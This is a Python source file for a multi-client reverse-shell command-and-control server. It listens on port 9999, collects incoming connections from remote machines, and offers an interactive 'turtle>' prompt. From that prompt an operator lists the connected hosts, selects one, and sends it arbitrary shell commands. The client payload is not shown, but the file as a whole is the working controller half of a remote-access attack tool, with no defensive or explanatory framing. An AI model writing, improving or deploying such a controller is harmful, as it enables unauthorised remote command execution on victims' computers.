import socket
import sys
import threading
import time
from queue import Queue


NUMBER_OF_THREADS=2
JOB_NUMBER=[1,2]
queue=Queue()
all_connections=[]
all_address=[]



def create_socket():
    try:
        global host
        global s
        global port
        host=""
        port=9999
        s=socket.socket()
    except socket.error as mag:
        print("socket creation error",str(mag))


def bind_socket():
    try:
        global host
        global s
        global port

        print("binding the socket")
        s.bind((host,port))
        s.listen(5)


    except socket.error as mag:
        print("socket binding error ",str(mag)," retrying")
        bind_socket()






def accepting_connection():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn,address=s.accept()
            s.setblocking(1)
            all_connections.append(conn)
            all_address.append(address)

            print("connection has been established", address[0])

        except:
            print("error accepting connections")


def start_turtle():

    while(True):
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif('select' in cmd):
            conn=get_target(cmd)
            if(conn is not None):
                send_target_commands(conn)

        else:
            print('command not recognized')


def list_connections():
    results=''

    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)

        except:
            del all_connections[i]
            del all_address[i]
            continue

        results=str(i)+"    "+str(all_address[i][0])+"   "+str(all_address[i][1])+ "\n"

    print("----Clients-----","\n",results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]

        print("you are now connected to",str(all_address[target][0]))
        print(str(all_address[target][0]),">",end="")
        return conn

    except:
        print("selection not valid")
        return None



def send_target_commands(conn):
    while True:
        try:
            cmd=input()
            if(cmd=="quit"):
                break
            if(len(str.encode(cmd))>0):
                conn.send(str.encode(cmd))
                client_response=str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("error sending command")
            break



def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()




def work():
    while(True):
        x=queue.get()
        if(x==1):
            create_socket()
            bind_socket()
            accepting_connection()

        if(x==2):
            start_turtle()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()




create_workers()
create_jobs()


